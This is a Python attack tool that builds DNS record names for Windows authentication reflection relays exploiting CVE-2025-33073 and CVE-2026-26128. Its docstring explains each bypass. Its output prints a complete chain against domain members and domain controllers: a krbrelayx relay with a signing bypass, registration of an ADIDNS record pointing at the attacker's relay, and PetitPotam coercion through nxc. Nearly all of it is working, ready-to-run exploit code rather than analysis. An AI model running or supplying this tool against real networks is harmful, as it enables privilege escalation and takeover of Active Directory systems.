#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""coerce_name.py - generate the SMB/Kerberos coercion name for a reflection relay.

Two name families, one tool (pick with --mode):

  cmti     CVE-2025-33073 marshalled-target-info name (Synacktiv). A constant, target-independent
           CREDENTIAL_TARGET_INFORMATION blob is glued to a hostname label:

               <host>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA

           On the victim, LsapCheckMarshalledTargetInfo strips the marshalled suffix, leaving just
           <host>; msv1_0!SspIsTargetLocalhost then sees <host> as local and performs a *privileged
           local* authentication, which the relay reflects back. The suffix never encodes the host,
           so it is identical for every target (that is why all public PoCs show the same bytes).

           The label is always `localhost`, which SspIsTargetLocalhost always treats as local -> ONE
           record works for every domain-joined machine, INCLUDING a DC, with no per-target record and
           no DNS lookup needed (only the marshalled-strip + localhost check). cmti is the vector while
           CVE-2025-33073 (patch #1) is UNPATCHED; patch #1 kills it (the CredUnmarshalTargetInfo
           trick is blocked), after which use --mode unicode.

           CAVEAT for reauthx: the localhost label makes the victim authenticate LOCALLY, i.e. over
           NTLM. reauthx is krbrelayx-based (Kerberos only) and will reject that mechtype, so this
           name is for an NTLM relay (e.g. ntlmrelayx). With reauthx, use --mode unicode: a real
           hostname label produces a Kerberos AP-REQ, which reauthx can reflect (validated on a DC).

  unicode  CVE-2026-26128 confusable name (Synacktiv). A confusable letter keeps the SAME
           LCMapStringEx(0x31403) sort-key as its ASCII counterpart, so the DC resolves the SPN to the
           real machine account; but it differs under CompareStringW(NORM_IGNORECASE), so DnsCache
           issues a DNS request instead of treating the name as "local". Dots are replaced with U+2024
           so the ADIDNS record does not collide with the machine record. Works on members AND DCs:
           self-reflection on a DC was validated (the DC resolves the confusable name via its own DNS
           just fine - the earlier "fails on a DC" claim was wrong). This is the vector once patch #1
           has killed cmti; it stays live until CVE-2026-26128 (patch #3) is applied.

This only GENERATES the name. Register it with dnstool.py and coerce with your usual tool. For the
unicode mode never copy-paste the name by hand (U+2024 dots look like real dots) - use the --raw
sub-shell form so the shell regenerates the exact bytes. The cmti name is plain ASCII and safe to
paste.

Examples:
  coerce_name.py                                  # cmti, universal localhost name + commands
  coerce_name.py --mode cmti --raw                # just the localhost cmti label (scripting)
  coerce_name.py srv1.ad.local --mode unicode     # unicode confusable name + commands
  coerce_name.py srv1.ad.local --mode unicode --raw
"""
import argparse
import base64
import os
import sys
import unicodedata

DOT = "․"
COMBINING_ACUTE = "́"
SELF = os.path.abspath(__file__)

# Constant CVE-2025-33073 marshalled CREDENTIAL_TARGET_INFORMATION blob (33 bytes), base64 (44 chars,
# no padding). Target-independent: its only job is to be stripped by LsapCheckMarshalledTargetInfo.
CMTI_SUFFIX = "1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
CMTI_SUFFIX_BYTES = bytes.fromhex(
    "d545a1442000000000000000000000000000000000000000000c1b100601000000")


def _self_check():
    """Guard against an accidental edit desyncing the string and the decoded bytes."""
    assert base64.b64encode(CMTI_SUFFIX_BYTES).decode() == CMTI_SUFFIX, "CMTI suffix / bytes mismatch"


# ---------------------------------------------------------------------------- unicode (CVE-2026-26128)
def circled(ch):
    if "A" <= ch <= "Z":
        return chr(0x24B6 + ord(ch) - ord("A"))
    if "a" <= ch <= "z":
        return chr(0x24D0 + ord(ch) - ord("a"))
    return None


def confusable(base, variant):
    if variant == "circled":
        return circled(base)
    if variant == "combining":
        return base + COMBINING_ACUTE
    if variant == "precomposed":
        comp = unicodedata.normalize("NFC", base + COMBINING_ACUTE)
        return comp if len(comp) == 1 else None
    return None


def make_unicode_name(fqdn, letter=None, variant="circled"):
    fqdn = fqdn.rstrip(".")
    if "." not in fqdn:
        sys.exit("[-] provide an FQDN (host.domain...)")
    label, zone = fqdn.split(".", 1)
    alpha = [i for i, c in enumerate(label) if circled(c)]
    if not alpha:
        sys.exit(f"[-] no Latin letter to substitute in {label!r}")
    if letter:
        idx = next((i for i in alpha if label[i].lower() == letter.lower()), None)
        if idx is None:
            sys.exit(f"[-] letter {letter!r} not found in {label!r}")
    else:
        idx = alpha[1] if len(alpha) > 1 else alpha[0]
    conf = confusable(label[idx], variant)
    if not conf:
        sys.exit(f"[-] no {variant} confusable for {label[idx]!r} (try --letter on a vowel)")
    host = label[:idx] + conf + label[idx + 1:]
    record = (host + "." + zone).replace(".", DOT)
    return {"fqdn": fqdn, "zone": zone, "record": record,
            "subst": f"{label[idx]!r} -> {conf!r} (" + "+".join("U+%04X" % ord(c) for c in conf) + f") @ pos {idx}"}


# ------------------------------------------------------------------------------- cmti (CVE-2025-33073)
def make_cmti_name(host="localhost"):
    host = host.rstrip(".").split(".")[0]  # short label only
    if not host:
        sys.exit("[-] empty cmti host")
    return {"host": host, "record": host + CMTI_SUFFIX, "universal": host.lower() == "localhost"}


# ------------------------------------------------------------------------------------------------ cli
def main():
    _self_check()
    ap = argparse.ArgumentParser(
        description="Generate the SMB/Kerberos coercion name (cmti=CVE-2025-33073, unicode=CVE-2026-26128).",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("target", nargs="?", help="target FQDN, e.g. srv1.ad.local (required for --mode unicode)")
    ap.add_argument("--mode", choices=["cmti", "unicode"], default="cmti",
                    help="name family (default cmti; works on members AND DCs)")
    ap.add_argument("--raw", action="store_true", help="print only the record name (for scripting / sub-shell)")
    # unicode options
    ap.add_argument("--variant", choices=["circled", "precomposed", "combining"], default="circled",
                    help="unicode: confusable family (default circled; on older Windows try precomposed)")
    ap.add_argument("--letter", help="unicode: which hostname letter to substitute (default: the 2nd one)")
    a = ap.parse_args()

    if a.mode == "unicode":
        _unicode_cli(a)
    else:
        _cmti_cli(a)


def _cmti_cli(a):
    # The marshalled suffix is only ever stripped by LsapCheckMarshalledTargetInfo; the label left
    # behind just has to pass SspIsTargetLocalhost. 'localhost' always does, on every domain-joined
    # host incl. a DC, so one universal record covers every target - no per-target label is needed.
    host = "localhost"
    info = make_cmti_name(host)

    if a.raw:
        sys.stdout.write(info["record"])
        return

    tgt = a.target or "<TARGET_FQDN>"
    print(f"[*] mode   : cmti (CVE-2025-33073 marshalled target info)")
    print(f"[*] record : {info['record']}")
    print(f"[*] host   : {info['host']}   ->   universal (works on every domain-joined host, incl. DC)")
    print("\n# run the relay first (separate shell); --reauth-bypass defeats the DC's enforced signing:")
    print(f"#   krbrelayx.py -t smb://{tgt} --reauth-bypass 'DOM/user:pass'")
    print("# 1) register the ADIDNS record -> your relay IP:")
    print(f"dnstool.py -u 'DOM\\user' -p 'pass' -r '{info['record']}' -d <RELAY_IP> -a add --tcp <DC_IP>")
    print("# 2) coerce the target to the cmti name:")
    print(f"nxc smb <TARGET_IP> -u user -p 'pass' -d DOM -M coerce_plus -o M=petitpotam LISTENER='{info['record']}'")
    print("# 3) cleanup when done:")
    print(f"dnstool.py -u 'DOM\\user' -p 'pass' -r '{info['record']}' -a ldapdelete --tcp <DC_IP>")


def _unicode_cli(a):
    if not a.target:
        sys.exit("[-] --mode unicode needs a target FQDN (host.domain...)")
    info = make_unicode_name(a.target, a.letter, a.variant)
    if a.raw:
        sys.stdout.write(info["record"])
        return

    ascii_view = "".join(c if ord(c) < 0x80 else f"<U+{ord(c):04X}>" for c in info["record"])
    regen = f'"$(python3 {SELF} {a.target} --mode unicode' + (f" --variant {a.variant}" if a.variant != "circled" else "") + \
            (f" --letter {a.letter}" if a.letter else "") + ' --raw)"'
    print(f"[*] mode   : unicode (CVE-2026-26128 confusable) - members AND DCs; use once patch #1 killed cmti")
    print(f"[*] record : {info['record']}   (ascii: {ascii_view})")
    print(f"[*] zone   : {info['zone']}   |   {info['subst']}")
    print("\n# run the relay first (separate shell):")
    print(f"#   krbrelayx.py -t smb://{info['fqdn']} --reauth-bypass 'DOM/user:pass'")
    print("# 1) register the ADIDNS record -> your relay IP  (never paste the Unicode by hand -> sub-shell):")
    print(f"dnstool.py -u 'DOM\\user' -p 'pass' -r {regen} -d <RELAY_IP> -a add --tcp <DC_IP>")
    print("# 2) coerce the target to the Unicode name:")
    print(f"nxc smb <TARGET_IP> -u user -p 'pass' -d DOM -M coerce_plus -o M=petitpotam LISTENER={regen}")
    print("# 3) cleanup when done:")
    print(f"dnstool.py -u 'DOM\\user' -p 'pass' -r {regen} -a ldapdelete --tcp <DC_IP>")


if __name__ == "__main__":
    main()
